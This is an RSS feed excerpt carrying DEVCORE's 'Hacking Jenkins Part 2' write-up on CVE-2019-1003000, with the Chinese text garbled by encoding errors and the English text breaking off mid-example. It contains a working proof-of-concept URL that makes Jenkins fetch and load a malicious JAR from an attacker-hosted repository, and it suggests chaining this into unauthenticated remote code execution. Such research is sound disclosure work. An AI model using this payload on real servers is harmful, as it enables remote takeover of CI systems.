&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&apos;orange.tw&apos;, root=&apos;http://[your_host]/&apos;)%0a
@Grab(group=&apos;tw.orange&apos;, module=&apos;poc&apos;, version=&apos;1&apos;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å½±ç‰‡:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;åˆ°æ­¤ï¼Œæˆ‘å€‘å·²ç¶“å¯ä»¥å®Œæ•´çš„æ§åˆ¶é ç«¯ä¼ºæœå™¨! é€é Meta-Programming åœ¨èªæ³•æ¨¹è§£ææ™‚æœŸå»å¼•å…¥æƒ¡æ„çš„ JAR æª”ï¼Œå†é€é Java çš„ Static Initializer ç‰¹æ€§å»åŸ·è¡Œä»»æ„æŒ‡ä»¤! é›–ç„¶ Jenkins æœ‰å…§å»ºçš„ Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;)ï¼Œä½†é€™å€‹æ¼æ´æ˜¯åœ¨ç·¨è­¯éšæ®µè€ŒéåŸ·è¡Œéšæ®µï¼Œå°è‡´ Sandbox æ¯«ç„¡ç”¨æ­¦ä¹‹è™•!&lt;/p&gt;

&lt;p&gt;ç”±æ–¼é€™æ˜¯å°æ–¼ Groovy åº•å±¤çš„ä¸€ç¨®æ”»æ“Šæ–¹å¼ï¼Œå› æ­¤åªè¦æ˜¯æ‰€æœ‰å¯ä»¥ç¢°è§¸åˆ° Groovy è§£æçš„åœ°æ–¹çš†æœ‰å¯èƒ½æœ‰æ¼æ´ç”¢ç”Ÿ! è€Œé€™ä¹Ÿæ˜¯é€™å€‹æ¼æ´å¥½ç©çš„åœ°æ–¹ï¼Œæ‰“ç ´äº†ä¸€èˆ¬é–‹ç™¼è€…èªç‚ºæ²’æœ‰åŸ·è¡Œå°±ä¸æœƒæœ‰å•é¡Œçš„æ€ç¶­ï¼Œå°æ”»æ“Šè€…ä¾†èªªä¹Ÿç”¨äº†ä¸€å€‹æ²’æœ‰é›»è…¦ç§‘å­¸çš„ç†è«–çŸ¥è­˜èƒŒæ™¯ä¸æœƒçŸ¥é“çš„æ–¹æ³•æ”»æ“Š! ä¸ç„¶ä½ æ ¹æœ¬ä¸æœƒæƒ³åˆ° Meta-Programming! é™¤äº†æˆ‘å›å ±çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; å…©å€‹é€²å…¥é»å¤–ï¼Œåœ¨æ¼æ´è¢«ä¿®å¾©å¾Œï¼Œ&lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; ä¹Ÿå¾ˆå¿«çš„æ‰¾åˆ°äº†å¦å¤–ä¸€å€‹&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;é€²å…¥é»&lt;/a&gt;å»è§¸ç™¼é€™å€‹æ¼æ´!&lt;/p&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œé€™å€‹æ¼æ´æ›´å¯ä»¥èˆ‡æˆ‘å‰ä¸€ç¯‡ &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; æ‰€ç™¼ç¾çš„æ¼æ´ä¸²èµ·ä¾†ï¼Œå»ç¹é Overall/Read çš„é™åˆ¶æˆç‚ºä¸€å€‹åç¬¦å…¶å¯¦ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´!(å¦‚æœä½ æœ‰å¥½å¥½çš„è®€å®Œé€™å…©ç¯‡æ–‡ç« ï¼Œæ‡‰è©²å°ä½ ä¸æ˜¯é›£äº‹XD) è‡³æ–¼æœ‰æ²’æœ‰æ›´å¤šçš„ç©æ³•? å°±äº¤çµ¦å¤§å®¶è‡ªç”±ç™¼æ®ä¸²å‡ºè‡ªå·±çš„æ”»æ“Šéˆå›‰!&lt;/p&gt;

&lt;p&gt;æ„Ÿè¬å¤§å®¶çš„é–±è®€ï¼ŒHacking Jenkins ç³»åˆ—æ–‡å°±åœ¨é€™è£¡å·®ä¸å¤šå…ˆå‘Šä¸€å€‹æ®µè½å›‰! æœªä¾†å°‡æœƒå†ç™¼è¡¨æ›´å¤šæœ‰è¶£çš„æŠ€è¡“ç ”ç©¶æ•¬è«‹æœŸå¾…!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkinsâ€™ dynamic routing is!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)! Although we could bypass the first ACL, we still canâ€™t do much things :(&lt;/p&gt;

&lt;p&gt;After Jenkins released the &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;First, we start from the Jenkins Pipeline to explain &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt;! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)&lt;/p&gt;

&lt;p&gt;In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but itâ€™s too tough. So the easiest way is to reuse existing function and library!&lt;/p&gt;

&lt;p&gt;As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here Jenkins validates the Pipeline with the method &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(â€¦)&lt;/a&gt;! It should be noted that this is just an AST parsing. Without running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, any dangerous invocation wonâ€™t be executed! If you try to parse the following Groovy script, you get nothing :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, itâ€™s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-meta-programming&quot;&gt;What is Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessorâ€¦) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!&lt;/p&gt;

&lt;p&gt;If it is still hard to understand, you can just regard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; as another Meta-Programming, which lets you operate the program on the fly. Although itâ€™s a little bit inaccurate, itâ€™s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C Macro&lt;/li&gt;
  &lt;li&gt;C++ Template&lt;/li&gt;
  &lt;li&gt;Java Annotation&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)&lt;/li&gt;
  &lt;li&gt;DSL(Domain Specific Languages, such as &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we are talking about Meta-Programming, we classify it into &lt;strong&gt;(1)compile-time&lt;/strong&gt; and &lt;strong&gt;(2)run-time Meta-Programming&lt;/strong&gt; according to the scope. Today, we focus on the compile-time Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Itâ€™s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Wiki&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561&quot;&gt;Ref1&lt;/a&gt;, &lt;a href=&quot;http://cs.lmu.edu/~ray/notes/metaprogramming/&quot;&gt;Ref2&lt;/a&gt;&lt;/em&gt;
&lt;em&gt;P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;From the previous section we know Jenkins validates Pipeline by &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(â€¦)&lt;/a&gt; and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?&lt;/p&gt;

&lt;p&gt;There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or the compiler resource bomb(make a 16GB ELF by just 18 bytes):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or calculating the Fibonacci number by compiler&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
